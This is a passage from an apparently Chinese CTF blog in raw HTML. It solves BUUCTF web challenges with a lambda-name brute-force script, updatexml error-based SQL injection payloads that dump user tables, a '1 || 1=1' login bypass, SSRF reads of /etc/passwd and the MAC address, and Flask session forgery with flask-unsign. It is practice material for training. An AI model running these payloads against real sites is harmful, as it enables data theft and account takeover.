class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$MY</span>);<br><span class="hljs-comment">//输出string(9) &quot;(我是一个不可见字符)lambda_1&quot;，后面的数字是随机变的。</span><br></code></pre></td></tr></table></figure><p>可以用<code>burp</code>的<code>intruder</code>模块爆破，或者写个<code>python</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://e50c90bb-2a05-4887-8d21-139d4eaa33de.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>):<br>    payload = <span class="hljs-string">&quot;\x00lambda_&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    get_data = &#123;<span class="hljs-string">&quot;func_name&quot;</span>: payload&#125;<br>    res = requests.get(url, params=get_data, timeout=<span class="hljs-number">5</span>)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h4 id="思路总结：-1"><a href="#思路总结：-1" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>create_function</code>？匿名函数的名字是什么？</p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>进去就是个报错：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Warning: mysqli_connect(): (HY000/2002): Connection refused in /var/www/html/index.php on line 2<br><span class="hljs-keyword">Error: </span>Unable to connect to MySQL. Debugging errno: 2002 Debugging error: Connection refused<br></code></pre></td></tr></table></figure><p><code>index.php</code>：</p><p><img src="/img/roosterctfbabyweb1.png" alt="roosterctfbabyweb1"></p><p>ban了单引号双引号，<code>union</code>,<code>or</code>,<code>sleep</code>这几个关键字。</p><p>后来测试发现<code>information</code>这东西并没有过滤。</p><p><code>1 order by 3#</code>返回 <code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>,<code>order by 2</code>正常。一共两列。</p><p>试了下报错注入：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>Cdatabase()%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)%<span class="hljs-number">23</span><br>//XPATH syntax error: <span class="hljs-string">&#x27;~sql_injection~&#x27;</span><br>updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>C(<span class="hljs-keyword">select</span>+<span class="hljs-built_in">table_name</span>+<span class="hljs-keyword">from</span>+information_schema.<span class="hljs-keyword">tables</span>+<span class="hljs-keyword">where</span>+table_schema%<span class="hljs-number">3</span>Ddatabase()+<span class="hljs-keyword">limit</span>+<span class="hljs-number">0</span>%<span class="hljs-number">2</span>C1)%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)<br>//XPATH syntax error: <span class="hljs-string">&#x27;~users~&#x27;</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-type">char</span>(<span class="hljs-number">117</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) #这里有个问题，users一定要写成<span class="hljs-type">char</span>的形式才有回显。。不知道为啥<br>//XPATH syntax error: <span class="hljs-string">&#x27;~USER,CURRENT_CONNECTIONS,TOTAL_&#x27;</span><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br>//<span class="hljs-keyword">admin</span>,john<br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(uniqueid) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>//<span class="hljs-number">837461526918364526</span>,<span class="hljs-number">123456789928</span><br><br></code></pre></td></tr></table></figure><p>输入<code>837461526918364526</code>这个<code>uniqueid</code>即可。</p><p>后面看其它师傅的<code>wp</code>直接用这种万能密码登录：</p><p><code>1 || 1=1 limit 0,1</code> ，这时<code>SQL</code>语句就变成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><code>uniqueid</code>这东西一共两列，<code>admin</code>对应的还在第一列。所以<code>limit 0,1</code>就相当查的<code>837461526918364526</code>对应的结果，或者：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路:"></a>总结思路:</h4><p><code>updatexml</code>报错注入？<code>char</code>形式绕过？若过滤了<code>or</code>，万能密码应如何构造？</p><h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p><img src="/img/ciscnweb4-1.png" alt="ciscnweb4-1"></p><p><code>read somethings</code>跳转，注意<code>URL</code>：</p><p><code>http://23348a06-4528-47fb-8442-d0428080c651.node5.buuoj.cn:81/read?url=https://baidu.com</code></p><p><img src="/img/ciscnweb4-2.png" alt="ciscnweb4-2"></p><p>输入不存在的<code>URL</code>会提示<code>no response</code>：</p><p><img src="/img/ciscnweb4-4.png" alt="ciscnweb4-4"></p><p>尝试读下<code>/etc/passwd</code>:</p><p><img src="/img/ciscnweb4-5.png" alt="ciscnweb4-5"></p><p>直接读<code>flag</code>发现被过滤了:</p><p><img src="/img/ciscnweb4-6.png" alt="ciscnweb4-6"></p><p>利用base64编码执行下：<code>echo L2ZsYWc=|base64 -d</code>，结果返回了<code>no response</code>。。然后想起刚才<code>glzjin</code>这个用户的家目录是<code>/app</code>，尝试读取<code>app.py</code>:</p><blockquote><p><strong>url&#x2F;read?id&#x3D;xxxx这种在url和参数中间又会有一段字符串的，可以考虑是写了路由，不是php后端，可能是python后端</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入模块</span><br>encoding:utf-<span class="hljs-number">8</span> <br><span class="hljs-keyword">import</span> re, random, uuid, urllib <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br><span class="hljs-comment"># 创建 Flask 应用和配置</span><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># 定义根路径路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! Read somethings&#x27;</span><br><br><span class="hljs-comment"># 定义读取路径路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <br>        <span class="hljs-comment"># 检查是否包含敏感关键词</span><br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        <br>        <span class="hljs-comment"># 尝试打开给定的 URL 并返回内容</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-comment"># 定义获取 flag 路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-comment"># 主程序</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>代码倒是不长，首先<code>URL</code>不允许出现<code>flag</code>和以<code>file</code>开头。最开始定义<code>session[&#39;username&#39;] = &#39;www-data&#39;</code>，在访问<code>/flag</code>路由时如果<code>if session and session[&#39;username&#39;] == &#39;fuck&#39;:</code>即可。另外注意到这东西开了<code>debug</code>模式，后面看看能不能通过构造<code>pin</code>码解题。</p><p>看下对密钥<code>SECRET_KEY</code>是怎么构造的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure><p>用本地计算机的网络硬件地址（MAC地址）作为随机数生成器的种子，生成一个伪随机的浮点数（在 0 到 233 之间），将其转换为字符串。所以想办法读<code>MAC</code>地址就行：</p><p><img src="/img/ciscnweb4key1.png" alt="ciscnweb4key1"></p><p>这里我看<code>wp</code>都是直接去读了<code>eth0</code>网卡。。不是很懂为啥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/read?url=/sys/<span class="hljs-keyword">class</span>/<span class="hljs-symbol">net</span>/<span class="hljs-symbol">eth0</span>/<span class="hljs-symbol">address</span><br>结果：<span class="hljs-symbol">aa:<span class="hljs-symbol">31</span>:<span class="hljs-symbol">08</span>:<span class="hljs-symbol">a5</span>:<span class="hljs-symbol">b9</span>:<span class="hljs-symbol">2b</span></span><br></code></pre></td></tr></table></figure><p>拿到MAC地址就能生成种子(注意这里要用python2，2和3保留的位数不一样)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># Write Python 2 code in this online editor and run it.</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br><span class="hljs-comment"># 假设的MAC地址</span><br>example_mac_address = <span class="hljs-string">&#x27;aa:31:08:a5:b9:2b&#x27;</span><br><br><span class="hljs-comment"># 转换MAC地址为整数</span><br>mac_integer = <span class="hljs-built_in">int</span>(example_mac_address.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 使用MAC地址整数初始化随机数生成器的种子</span><br>random.seed(mac_integer)<br><br><span class="hljs-comment"># 生成0到233之间的随机浮点数</span><br>random_float = random.random() * <span class="hljs-number">233</span><br><br><span class="hljs-comment"># 将生成的随机浮点数作为字符串赋值给应用程序的SECRET_KEY</span><br>app_config_secret_key = <span class="hljs-built_in">str</span>(random_float)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAC地址整数:&quot;</span>, mac_integer) <span class="hljs-comment">#MAC是十六进制的，直接把它转为整数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成的随机浮点数:&quot;</span>, random_float)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;应用程序的SECRET_KEY:&quot;</span>, app_config_secret_key)<br><span class="hljs-comment"># 结果：22.4625144346</span><br></code></pre></td></tr></table></figure><p>抓包看下<code>SESSION</code>:</p><p><code>eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZZkYxw.byfbQe9w4mPGETQZMlAOtQgjckI</code></p><p>放<code>FLASK-UNSIGN</code>里：</p><p><img src="/img/ciscnweb4key2flag.png" alt="ciscnweb4key2flag"></p><p>顺便记录下用法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;42e9&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;22.4625144346&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>&#123;<span class="hljs-string">&#x27;balance&#x27;</span>: <span class="hljs-number">1336</span>, <span class="hljs-string">&#x27;purchases&#x27;</span>: <span class="hljs-selector-attr">[]</span>&#125;<br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;balance&#x27;: 1338, &#x27;purchases&#x27;: []&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>然后访问<code>/flag</code>路由改下session字段就行</p><p><code>PIN</code>码构造参考这位师傅的文章：<code>https://xz.aliyun.com/t/11647?page=1</code></p><h4 id="总结思路-1"><a href="#总结思路-1" class="headerlink" title="总结思路:"></a>总结思路:</h4><p><code>/etc/passwd</code>下是否由可用信息？家目录在哪？url和参数中间存在字符串时是否要考虑写了路由？MAC地址获取？伪随机数？</p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> 